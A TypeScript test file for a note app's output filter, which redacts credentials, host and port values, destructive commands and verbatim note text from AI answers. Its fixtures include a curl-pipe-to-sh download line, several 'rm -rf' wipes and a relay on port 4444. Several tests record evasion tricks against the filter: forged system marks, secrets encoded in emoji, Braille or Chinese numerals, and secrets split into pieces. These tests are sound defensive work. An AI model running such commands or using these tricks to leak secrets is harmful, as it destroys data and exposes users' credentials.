/**
 * R314 修改轮（docs/decision-r314.md）：R313 三件硬阻断 + 体验项的回归合同。
 *  P0-1 系统占位带外识别：整串白名单 + 哨兵化，不再按「开头文本」放行；笔记原文以〔警示：/已隔离/原文查看 开头一律照常收口。
 *  P0-2 直答层凭证短串记号级占位；破坏性命令单列 broad:destructive（高警示卡 + 答案内警示行）；凭证形态不再归 broad:code。
 *  P1-1 聚合层照抄型占位墙 → 概括 + 指引；占位不切句中。
 *  P2   composedLabels 不再跳过收口。
 */
import { describe, it, expect } from "vitest";
import {
  closeAggregateVerbatim,
  endpointValueTokens,
  closeVerbatimForTier,
  finalizeAskAnswer,
  verbatimOverlapSpans,
  broadFoldReason,
  defaultFoldedReason,
  credentialValueTokens,
  closeCredentialValues,
  isDestructiveCommandText,
  markDestructiveCommandLines,
  collapsePlaceholderWall,
  maskSystemMarks,
  foldOutletTag,
  foldOutletWarnLine,
  AGGREGATE_TIER,
  AGGREGATE_LCS_CHARS,
  VERBATIM_SPAN_PLACEHOLDER,
  VERBATIM_REDIRECT_NOTICE,
  AGGREGATE_VERBATIM_GUIDE,
  INSTRUCTION_ISOLATED_MARK,
  EXEC_ISOLATED_MARK,
  CREDENTIAL_SPAN_PLACEHOLDER,
  DESTRUCTIVE_WARN_MARK,
  DESTRUCTIVE_OUTLET_TAG,
  CREDENTIAL_OUTLET_FOLD_TAG,
  BROAD_OUTLET_FOLD_TAG,
  DIRECT_GUARD_PLACEHOLDER,
} from "../src/prompt-armor";
import { pushSnippet } from "../src/push";
import { ledgerLabel, buildFinanceMomAnswer } from "../src/ask";
import { financeStats } from "../src/reports";
import { R314_MARK_PREFIX_CARRIERS, R314_CREDENTIAL_CARRIERS, R314_DESTRUCTIVE_CARRIERS, R314_BENIGN_COMMANDS } from "../scripts/qa-r314/new-carriers";

const PH = VERBATIM_SPAN_PLACEHOLDER;
const leaks = (out: string, units: string[]): number =>
  verbatimOverlapSpans(out.split(PH).join(""), units, { lcs: AGGREGATE_LCS_CHARS, lineMin: Number.POSITIVE_INFINITY }).length;
const noMidSentencePlaceholder = (out: string): boolean => {
  let at = out.indexOf(PH);
  while (at !== -1) {
    const left = out.slice(Math.max(0, at - 1), at);
    if (left !== "" && !/[\s。！？!?；;.、\-*+•)）.\]〕]/.test(left)) return false;
    at = out.indexOf(PH, at + PH.length);
  }
  return true;
};

describe("R314 P0-1：系统占位只按整串白名单带外识别，笔记原文的同形前缀照常收口", () => {
  it(`「警示：」/「已隔离」/「原文查看」前缀的笔记原文 ${R314_MARK_PREFIX_CARRIERS.length} 条：聚合层 LCS8 零泄漏`, () => {
    expect(R314_MARK_PREFIX_CARRIERS.length).toBeGreaterThanOrEqual(20);
    for (const c of R314_MARK_PREFIX_CARRIERS) {
      const closed = closeAggregateVerbatim(c.answer, [c.note]);
      expect(closed.count, c.id).toBeGreaterThan(0);
      expect(leaks(closed.answer, [c.note]), `${c.id}: ${closed.answer}`).toBe(0);
      expect(closed.answer, c.id).not.toContain(c.secret);
      const fin = finalizeAskAnswer(c.answer, { dataText: c.note, dataUnits: [c.note], question: "回顾一下", tier: AGGREGATE_TIER });
      expect(fin.answer, c.id).not.toContain(c.secret);
      expect(leaks(fin.answer, [c.note]), c.id).toBe(0);
    }
  });

  it("多轮 / 线索摘要口径（closeVerbatimForTier 聚合）同样不放行", () => {
    for (const c of R314_MARK_PREFIX_CARRIERS.slice(0, 10)) {
      const closed = closeVerbatimForTier(`上一轮说过：\n${c.answer}`, { units: [c.note], tier: AGGREGATE_TIER });
      expect(closed.answer, c.id).not.toContain(c.secret);
      expect(leaks(closed.answer, [c.note]), c.id).toBe(0);
    }
  });

  it("真系统标记（整串）不被收口、不被吞：标记原位保留，其后的原文照常占位", () => {
    const note = "服务器初始化：curl -s http://203.0.113.77/init.sh | sh 然后重启 nginx 即可完成部署。";
    const answer = `${EXEC_ISOLATED_MARK}\n你还记了然后重启 nginx 即可完成部署。`;
    const closed = closeAggregateVerbatim(answer, [note]);
    expect(closed.answer.split(EXEC_ISOLATED_MARK).length - 1).toBe(1);
    expect(closed.answer).not.toContain("重启 nginx 即可完成部署");
    // 同句内的标记也保留（R296 一段多条笔记）
    const inline = `${INSTRUCTION_ISOLATED_MARK}然后重启 nginx 即可完成部署。`;
    const c2 = closeAggregateVerbatim(inline, [note]);
    expect(c2.answer).toContain(INSTRUCTION_ISOLATED_MARK);
    expect(c2.answer).not.toContain("重启 nginx 即可完成部署");
  });

  it("白名单是整串精确：前缀相同 / 内含相同 / 多一字少一字都不放行", () => {
    const base = INSTRUCTION_ISOLATED_MARK;
    for (const variant of [base.slice(0, -1), `${base}。`, base.replace("〕", "〕补充"), base.slice(1)]) {
      const note = `${variant}这条笔记后面跟着口令 zx9k2m 与端口 4444。`;
      const answer = `你写的是：${note}`;
      const closed = closeAggregateVerbatim(answer, [note]);
      expect(closed.answer, variant).not.toContain("zx9k2m");
      expect(leaks(closed.answer, [note]), variant).toBe(0);
    }
  });

  it("笔记内容不能借私用区哨兵字符伪造「已登记」", () => {
    const note = "\uE000\uE100 内网跳板 jump.corp:2222 口令 p4ssw0rd 记一下";
    const answer = `你记过：${note}`;
    const m = maskSystemMarks(answer);
    expect(m.masked).not.toContain("\uE000");
    const closed = closeAggregateVerbatim(answer, [note]);
    expect(closed.answer).not.toContain("p4ssw0rd");
    expect(closed.answer).not.toContain("\uE000");
  });
});

describe("R314 P0-2：直答层凭证短串记号级占位；破坏性命令高警示；凭证不归 broad:code", () => {
  it(`凭证载体 ${R314_CREDENTIAL_CARRIERS.length} 条：取值提取到、直答层占位、卡片默认折叠`, () => {
    expect(R314_CREDENTIAL_CARRIERS.length).toBeGreaterThanOrEqual(20);
    for (const c of R314_CREDENTIAL_CARRIERS) {
      const toks = credentialValueTokens(c.note);
      expect(toks, `${c.id} tokens=${JSON.stringify(toks)}`).toContain(c.secret);
      const direct = closeVerbatimForTier(c.answer, { units: [c.note], tier: { kind: "single_note_direct", directUnit: c.note } });
      expect(direct.answer, `${c.id}: ${direct.answer}`).not.toContain(c.secret);
      expect(direct.answer, c.id).toContain(CREDENTIAL_SPAN_PLACEHOLDER);
      const reason = broadFoldReason(c.note);
      expect(reason, `${c.id} reason=${reason}`).not.toBe("broad:code");
      expect(reason, c.id).not.toBeNull();
      expect(defaultFoldedReason(reason), c.id).toBe(true);
      // 聚合层：短串（<8）同样按凭证取值占位，LCS8 基线不动
      const agg = closeAggregateVerbatim(c.answer, [c.note]);
      expect(agg.answer, c.id).not.toContain(c.secret);
    }
  });

  it("直答层凭证占位是记号级：句子其余内容保留（可用性）", () => {
    const note = "家里路由器 WiFi 密码是 sunny2024，管理后台 192.168.1.1 用户名 admin。";
    const out = closeCredentialValues("你的 WiFi 密码是 sunny2024，管理后台在 192.168.1.1。", [note]);
    expect(out.count).toBe(1);
    expect(out.answer).toBe(`你的 WiFi 密码是 ${CREDENTIAL_SPAN_PLACEHOLDER}，管理后台在 192.168.1.1。`);
  });

  it("无凭证词的登录句式（R313 J27「用 tr7q92x 登录后」）：混合串算凭证取值，直答层占位；「用 iPhone 登录」不算", () => {
    const note = "（警示）中继 relay3.example.net 用 tr7q92x 登录后 rm -rf 清盘";
    expect(credentialValueTokens(note)).toContain("tr7q92x");
    expect(credentialValueTokens("平时用 iPhone 登录，偶尔用 win11 登录")).toEqual([]);
    const direct = closeVerbatimForTier("中继那条讲的是中继 relay3.example.net 用 tr7q92x 登录后 rm -rf 清盘 [1]", { units: [note], tier: { kind: "single_note_direct", directUnit: note } });
    expect(direct.answer).not.toContain("tr7q92x");
    expect(direct.answer).toContain(CREDENTIAL_SPAN_PLACEHOLDER);
  });

  it("数量 / 年份 / 说明性数字不是凭证（「密码 8 位以上」「密钥 2024 年更换」）", () => {
    for (const s of ["银行要求密码 8 位以上，含大小写", "API 密钥 2024 年 3 月更换过一次", "验证码 6 位数字，5 分钟内有效", "密码强度至少 12 字符"]) {
      expect(credentialValueTokens(s), s).toEqual([]);
      expect(broadFoldReason(s), s).not.toBe("broad:credential");
    }
  });

  it(`破坏性命令 ${R314_DESTRUCTIVE_CARRIERS.length} 条：broad:destructive、默认展示、出口高警示标；R320 直答命令不逐字，换高警示占位 + 点开指引`, () => {
    for (const c of R314_DESTRUCTIVE_CARRIERS) {
      expect(isDestructiveCommandText(c.note), c.id).toBe(true);
      const reason = broadFoldReason(c.note);
      expect(reason, `${c.id} reason=${reason}`).toBe("broad:destructive");
      expect(defaultFoldedReason(reason)).toBe(false);
      expect(foldOutletTag(reason)).toBe(DESTRUCTIVE_OUTLET_TAG);
      expect(foldOutletWarnLine(reason)).toContain("破坏性命令");
      const fin = finalizeAskAnswer(c.answer, {
        dataText: c.note,
        dataUnits: [c.note],
        question: c.question,
        tier: { kind: "single_note_direct", directUnit: c.note },
      });
      // R320 A：直答层不再「警示行 + 命令原样交付」——命令本身不进问答区，整句换破坏性高警示占位（自带「核对对象与参数」警示），
      // 角标保留供点开卡片；旧警示行不再出现（没有逐字命令可警示）。比 R314 旧契约更严：命令一字不出。
      expect(fin.answer, c.id).not.toContain(c.command);
      expect(fin.answer, c.id).toContain(DIRECT_GUARD_PLACEHOLDER.destructive);
      expect(fin.answer, c.id).not.toContain(DESTRUCTIVE_WARN_MARK);
      for (const m of c.answer.match(/\[\d+\]/g) ?? []) expect(fin.answer, c.id).toContain(m);
    }
  });

  it(`日常命令备忘 ${R314_BENIGN_COMMANDS.length} 条仍是 broad:code / 不折叠（默认展示、无高警示）`, () => {
    for (const s of R314_BENIGN_COMMANDS) {
      expect(isDestructiveCommandText(s), s).toBe(false);
      const reason = broadFoldReason(s);
      expect(reason === null || reason === "broad:code", `${s} reason=${reason}`).toBe(true);
      expect(defaultFoldedReason(reason), s).toBe(false);
      expect(markDestructiveCommandLines(s).count).toBe(0);
    }
  });

  it("Push 摘要：破坏性 / 凭证形态各有专用文案，与应用内默认展示一致（破坏性不说「已折叠」）", () => {
    const d = pushSnippet({ is_sensitive: 0, title: "清盘脚本", content: "sudo rm -rf /var/lib/docker/*" }, "敏感", "");
    expect(d.fold).toBe(false);
    expect(d.text).toContain("破坏性命令");
    const k = pushSnippet({ is_sensitive: 0, title: "路由器", content: "路由器密码 admin1234" }, "敏感", "");
    expect(k.fold).toBe(true);
    expect(k.text).toContain("口令/密钥");
    expect(k.text).not.toContain("admin1234");
    const code = pushSnippet({ is_sensitive: 0, title: "打包", content: "tar -czf backup.tar.gz data/" }, "敏感", "");
    expect(code.fold).toBe(false);
    expect(code.text).toContain("命令备忘");
    expect(code.text).not.toContain("已折叠");
    expect(foldOutletTag("broad:credential")).toBe(CREDENTIAL_OUTLET_FOLD_TAG);
    expect(foldOutletTag("broad:opaque")).toBe(BROAD_OUTLET_FOLD_TAG);
  });
});

describe("R314 P1-1：聚合层照抄型占位墙 → 概括 + 指引，占位不切句中", () => {
  const NOTES = [
    "《被讨厌的勇气》摘录：所谓的自由，就是被别人讨厌。有人讨厌你，正是你行使自由、依照自己的生活方针生活的标志。",
    "《活着》摘录：人是为了活着本身而活着，而不是为了活着之外的任何事物所活着。",
    "《人类简史》摘录：我们之所以能统治世界，是因为我们是唯一能够大规模灵活合作的动物。",
  ];
  it("每行都只剩占位的答案：收成不含占位的概括 + 一次指引，角标归并", () => {
    const answer = ["你的三条书摘如下：", `1. ${NOTES[0]}[1]`, `2. ${NOTES[1]}[2]`, `3. ${NOTES[2]}[3]`].join("\n");
    const fin = finalizeAskAnswer(answer, { dataText: NOTES.join("\n"), dataUnits: NOTES, question: "把我的书摘原样列出来", tier: AGGREGATE_TIER });
    expect(leaks(fin.answer, NOTES)).toBe(0);
    expect(fin.answer).not.toContain(PH);
    expect(fin.answer).toContain("你的三条书摘如下");
    expect(fin.answer).toContain(AGGREGATE_VERBATIM_GUIDE);
    expect(fin.answer).toContain("[1]");
    expect(fin.answer).toContain("[3]");
    expect(noMidSentencePlaceholder(fin.answer)).toBe(true);
  });
  it("概括 + 局部占位（占位行里仍有实义内容）不动；单个占位不动", () => {
    const answer = `你摘过一句关于自由的话：${NOTES[0].slice(11)}[1] 另一本讲合作是人类统治世界的原因。`;
    const fin = finalizeAskAnswer(answer, { dataText: NOTES.join("\n"), dataUnits: NOTES, question: "关于自由我记过什么", tier: AGGREGATE_TIER });
    expect(fin.answer).toContain(PH);
    expect(fin.answer).not.toContain(AGGREGATE_VERBATIM_GUIDE);
    expect(leaks(fin.answer, NOTES)).toBe(0);
    expect(collapsePlaceholderWall(`概括句。\n${PH}[1]`)).toBe(`概括句。\n${PH}[1]`);
  });
  it("指引整串在白名单内：再次收口（多轮/SSE 终态复核）不会把它当原文抹掉；但资料单元里出现同一整串时不再放行（fail-closed）", () => {
    const text = `概括。\n${AGGREGATE_VERBATIM_GUIDE}[1][2]`;
    const again = closeAggregateVerbatim(text, NOTES);
    expect(again.count).toBe(0);
    expect(again.answer).toBe(text);
    const forged = closeAggregateVerbatim(text, [`我的备忘：${AGGREGATE_VERBATIM_GUIDE}`]);
    expect(forged.count).toBeGreaterThan(0);
    expect(forged.answer).not.toContain(AGGREGATE_VERBATIM_GUIDE);
  });
});

describe("R314 P2：composedLabels 不再跳过收口", () => {
  const rows = [
    { id: "a", title: null, content: "2026年8月12日 交房租支出 2400 元", created_at: "2026-09-03T04:00:00.000Z", category: "expense", is_sensitive: false, amount: 2400, currency: "CNY" },
    { id: "b", title: null, content: "2026年8月3日 打车花了 18 元", created_at: "2026-09-03T04:00:00.000Z", category: "expense", is_sensitive: false, amount: 18, currency: "CNY" },
  ] as never[];
  const units = (rows as Array<{ content: string }>).map((r) => r.content);
  it("记账答案（标签已收、日期金额结构化）照常通过：不被误抹", () => {
    expect(ledgerLabel(rows[0] as never)).toBe(PH);
    const mom = buildFinanceMomAnswer(financeStats(rows as never), financeStats([] as never), "2026年8月", "2026年7月");
    const fin = finalizeAskAnswer(mom, { dataText: units.join("\n"), dataUnits: units, question: "8月支出多少", tier: AGGREGATE_TIER, composedLabels: true });
    expect(fin.answer).toBe(mom);
  });
  it("逐笔明细：标签 + 系统金额拼出的 ≥8 字公共串不抹金额行；日期已剥的标签只按标签自身收口", () => {
    const ledger = ["2026年8月12日 交房租支出 2400 元", "2026年8月15日 咖啡花了 24 元", "2026年8月18日 超市购物花了 156 元", "2026年7月15日 交水电费支出 180 元"];
    const u = ledger.map((c) => `\n${c}`);
    const lines = ["交房租支出", "咖啡花了 24 元", "超市购物花了 156 元", "交水电费支出"].map((l, i) => `- ${l}（¥${[2400, 24, 156, 180][i]}，2026-09-04）[${i + 1}]`);
    const ans = `2026年8月你共记了 4 笔支出：\n- CNY：支出 ¥2760\n逐笔明细：\n${lines.join("\n")}`;
    const fin = finalizeAskAnswer(ans, { dataText: u.join("\n"), dataUnits: u, question: "8月都有哪些支出？", tier: AGGREGATE_TIER, composedLabels: true });
    for (const a of ["¥2400", "¥24", "¥156", "¥180", "¥2760"]) expect(fin.answer, a).toContain(a);
    expect(fin.answer.split("\n").length).toBe(ans.split("\n").length);
    expect(fin.answer).not.toContain("超市购物花了 156 元");
    expect(fin.answer).toContain(`${PH}（¥156，2026-09-04）[3]`);
    expect(fin.answer).toContain("- 交房租支出（¥2400");
    expect(fin.answer).not.toContain(AGGREGATE_VERBATIM_GUIDE);
    const cmp = "2026年7月与2026年8月对比：\n- CNY：支出 2026年7月 ¥180，2026年8月 ¥2580，较2026年8月少 ¥2400\n2026年7月共 1 笔支出；2026年8月共 3 笔支出。";
    expect(finalizeAskAnswer(cmp, { dataText: u.join("\n"), dataUnits: u, question: "7月和8月支出各是多少？", tier: AGGREGATE_TIER, composedLabels: true }).answer).toBe(cmp);
  });
  it("带 composedLabels 的答案若混入笔记原文（seam J21），照常收口", () => {
    const fake = `2026年8月 支出 ¥2418\n明细：${units[0]}\n${units[1]}`;
    const fin = finalizeAskAnswer(fake, { dataText: units.join("\n"), dataUnits: units, question: "8月支出多少", tier: AGGREGATE_TIER, composedLabels: true });
    expect(fin.answer).not.toContain("交房租支出 2400 元");
    expect(fin.answer).not.toContain("打车花了 18 元");
    expect(leaks(fin.answer, units)).toBe(0);
    expect(fin.answer).toContain("¥2418");
  });
});

describe("R314 聚合层补充：符号编码段（归一后为空串的旗帜字母 / 箭头 / 数学 / 盲文）按原面比对", () => {
  const units = [
    "中继主机名用旗帜拼：🇷 🇪 🇱 🇦 🇾 🇩，端口照旧",
    "路线口令：→→↓←↑→↓↓（按顺序输入）",
    "备用密钥形态：≠≠∑∑∆∆≈≈",
    "盲文写的路径：⠓⠞⠞⠏⠎⠉⠕⠍ 别念出来",
  ];
  const syms = ["🇷 🇪 🇱 🇦 🇾 🇩", "→→↓←↑→↓↓", "≠≠∑∑∆∆≈≈", "⠓⠞⠞⠏⠎⠉⠕⠍"];
  it("答案复述符号段 ⇒ 整句占位", () => {
    for (const [i, sym] of syms.entries()) {
      const ans = `这条记的是 ${sym}[${i + 1}]。`;
      const out = closeAggregateVerbatim(ans, units).answer;
      expect(out).toContain(PH);
      expect(out.replace(/[\s\u200d\ufe0f]/g, "")).not.toContain(sym.replace(/[\s\u200d\ufe0f]/g, ""));
    }
  });
  it("ASCII 运算符（===、=>）与不在资料里的表情不触发", () => {
    const code = ["const eq = a === b => c"];
    expect(closeAggregateVerbatim("判断用 a === b 即可[1]。", code).count).toBe(0);
    expect(closeAggregateVerbatim("今天心情不错 😀😀😀[1]。", ["午饭吃了面"]).count).toBe(0);
  });
  it("直答层：符号段本就在同屏卡片里 ⇒ 不计", () => {
    const r = closeVerbatimForTier(`口令是 →→↓←↑→↓↓[1]。`, { units: [units[1]], tier: { kind: "single_note_direct", directUnit: units[1] } });
    expect(r.aggregate).toBe(0);
  });
});

describe("R314 聚合层补充：拼接复述（per-unit-gram 缝，R313 J07「管道给sh」）", () => {
  const units = ["第一段命令：取回文件", "第二段命令：管道给 sh 跑掉"];
  it("每段公共串 <8 但整句几乎全由资料片段拼成（夹填充字）⇒ 整句占位", () => {
    for (const ans of [
      "第二段命令是管道给 sh 跑掉 [2]。",
      "取回文件，然后管道给 sh 跑掉 [1][2]。",
      "两段命令合起来的做法是：取回文件，然后管道给 sh 跑掉 [1] [2]。具体来说，第一段命令是取回文件 [1]，第二段命令是管道给 sh 跑掉 [2]。",
    ]) {
      const out = closeAggregateVerbatim(ans, units).answer;
      expect(out.replace(/\s/g, "")).not.toContain("管道给sh");
      expect(out).toContain(PH);
    }
  });
  it("真正的改述（覆盖率低）不触发；短句（<8 归一化字）不触发", () => {
    expect(closeAggregateVerbatim("先把文件取回来，再交给 shell 执行就行 [1][2]。", units).count).toBe(0);
    expect(closeAggregateVerbatim("取回文件 [1]。", units).count).toBe(0);
    expect(closeAggregateVerbatim("今天要买牛奶和鸡蛋，顺路去健身房 [1][2]。", ["买牛奶和鸡蛋", "去健身房"]).count).toBe(0);
  });
  it("直答层：片段本就在同屏卡片里 ⇒ 不计", () => {
    const r = closeVerbatimForTier("第二段命令是管道给 sh 跑掉 [1]。", { units: [units[1]], tier: { kind: "single_note_direct", directUnit: units[1] } });
    expect(r.aggregate).toBe(0);
  });
});

describe("R314 聚合层补充：分节拼装凭证（R313 J06「8kd ⫽ 2mv ⫽ 5qz」）", () => {
  const units = ["密钥第一节 8kd", "密钥第二节 2mv", "密钥第三节 5qz"];
  it("答案里由各节无缝铺成的字母数字混合记号 ⇒ 整句占位", () => {
    const r = closeAggregateVerbatim("三节连起来是 8kd2mv5qz[1][2][3]。", units);
    expect(r.answer).not.toContain("8kd2mv5qz");
    expect(r.answer).toContain(PH);
  });
  it("不可铺满 / 纯数字 / 纯字母记号不触发", () => {
    expect(closeAggregateVerbatim("版本号是 v20260903 [1]。", ["发布 v2 计划", "9月3日"]).count).toBe(0);
    // 铺满判据本身对 8kdXX2mv 不触发（中间夹了资料里没有的 XX），但 R320 起聚合层对答案里任何高熵短记号一律占位（更严）：
    // 「8kd 接 2mv」这种没拼成一个记号的说法才放行
    expect(closeAggregateVerbatim("合并后是 8kd 接 2mv [1][2]。", units).count).toBe(0);
    const r320 = closeAggregateVerbatim("合并后是 8kdXX2mv [1][2]。", units);
    expect(r320.answer).not.toContain("8kdXX2mv");
    expect(r320.answer).toContain("[1][2]");
    expect(closeAggregateVerbatim("总计 202609 件 [1][2]。", ["2026", "09 件"]).count).toBe(0);
  });
  it("直答层：整段记号本就在同屏卡片里 ⇒ 不计", () => {
    const one = ["密钥 8kd2mv5qz"];
    const r = closeVerbatimForTier("密钥是 8kd2mv5qz[1]。", { units: one, tier: { kind: "single_note_direct", directUnit: one[0] } });
    expect(r.aggregate).toBe(0);
  });
});

describe("R314 聚合层补充：端点取值（端口 / 主机 / 域名 / IP，R313 D01「4444」/ F01「8443」/ B01「relay3」）", () => {
  it("取值提取：端口 2–5 位数字；主机/域名含字母且带数字或点；点分 IPv4；纯单词与带量词的数不算", () => {
    expect(endpointValueTokens("部署卡：主机 relay3。域名 a.io。端口 4444。口令 k7f2a1。")).toEqual(expect.arrayContaining(["4444", "relay3", "a.io"]));
    expect(endpointValueTokens("| 主机 | a.io |\n| 端口 | 4444 |")).toEqual(expect.arrayContaining(["4444", "a.io"]));
    expect(endpointValueTokens("中继机前半段名字：relay3")).toContain("relay3");
    expect(endpointValueTokens("服务器地址 10.0.0.9，网关是 10.0.0.1")).toEqual(expect.arrayContaining(["10.0.0.9", "10.0.0.1"]));
    expect(endpointValueTokens("服务器 Nginx 配置要改")).toEqual([]);
    expect(endpointValueTokens("端口 8 位以上；服务器 2024 年换")).toEqual([]);
    expect(endpointValueTokens("地址：北京市朝阳区 3 号楼")).toEqual([]);
  });
  it("中文数字/谐音写法（R313 盲测 G01/G03）：端点词后含中文数字或「点」的汉字串算取值；无数字的地点描述不算", () => {
    expect(endpointValueTokens("地址：一点二点三点四，端口四千四")).toEqual(expect.arrayContaining(["一点二点三点四", "四千四"]));
    expect(endpointValueTokens("主机叫中继三，域名是例子点网")).toEqual(expect.arrayContaining(["中继三", "例子点网"]));
    expect(endpointValueTokens("服务器 Nginx 的地址是公司楼下")).toEqual([]);
    expect(endpointValueTokens("会议地址：北京海淀")).toEqual([]);
    const units = ["\n地址：一点二点三点四，端口四千四", "\n主机叫中继三，域名是例子点网", "\n今天跑步五公里"];
    const fin = finalizeAskAnswer("主机名：中继三\n端口：四千四\n地址：一点二点三点四", { dataText: units.join("\n"), dataUnits: units, question: "主机名和端口分别是什么，只回答值", tier: AGGREGATE_TIER });
    for (const n of ["中继三", "四千四", "一点二点三点四"]) expect(fin.answer).not.toContain(n);
    const ok = finalizeAskAnswer("你最近记了跑步与购物两类内容。", { dataText: units.join("\n"), dataUnits: units, question: "最近记了什么", tier: AGGREGATE_TIER });
    expect(ok.answer).toBe("你最近记了跑步与购物两类内容。");
  });
  it("聚合层：端点取值在答案里出现 ⇒ 所在句/行占位（D01 / F01 / B01）", () => {
    const d01 = ["部署卡：主机 relay3。域名 a.io。端口 4444。口令 k7f2a1。动作 直接跑。"];
    const out = closeAggregateVerbatim("- 主机 relay3[1]\n- 端口 4444[1]\n- 动作 直接跑[1]", d01).answer;
    expect(out).not.toContain("4444");
    expect(out).not.toContain("relay3");
    expect(out).toContain("直接跑");
    const b01 = ["中继机前半段名字：relay3", "中继机后半段域名：例子网 net"];
    expect(closeAggregateVerbatim("中继机完整地址拼起来是什么：relay3 netrelay3[1][2]", b01).answer).not.toContain("relay3 net");
  });
  it("聚合层：答案里的同形数字带字母/数字边界时不算（40444 / 端口值嵌在长数里）", () => {
    const u = ["端口 4444"];
    expect(closeAggregateVerbatim("编号 40444 已归档 [1]。", u).count).toBe(0);
  });
  it("直答层：端点值本就在同屏卡片里 ⇒ 不计（P0-2 只收凭证）", () => {
    const u = ["部署卡：主机 relay3。端口 4444。"];
    const r = closeVerbatimForTier("主机 relay3，端口 4444 [1]。", { units: u, tier: { kind: "single_note_direct", directUnit: u[0] } });
    expect(r.aggregate).toBe(0);
  });
});

describe("R314 聚合层补充：代码形态单元的短命令短语（R313 J07「管道给 sh」，CODE_UNIT_LCS）", () => {
  it("命令片段单元与答案的含 ASCII 公共串 ≥4 字 ⇒ 所在句占位；纯中文说明文字不计", () => {
    const units = ["第一段命令：取回文件", "第二段命令：管道给 sh 跑掉"];
    const out = closeAggregateVerbatim("合起来就是把取回的文件管道给 sh 跑掉[1][2]。", units).answer;
    expect(out).not.toContain("管道给 sh");
    // 只复述中文说明（不含命令短语）不受 CODE_UNIT_LCS 影响。
    expect(closeAggregateVerbatim("两条都是分段命令的说明[1][2]。", units).count).toBe(0);
  });
  it("非代码形态单元不按 CODE_UNIT_LCS 口径收（<8 字的普通短语照常保留）", () => {
    const units = ["行程卡：城市 杭州。日期 周五。车次 G31。同行 两人。"];
    expect(closeAggregateVerbatim("车次 G31，两人同行 [1]。", units).count).toBe(0);
  });
});
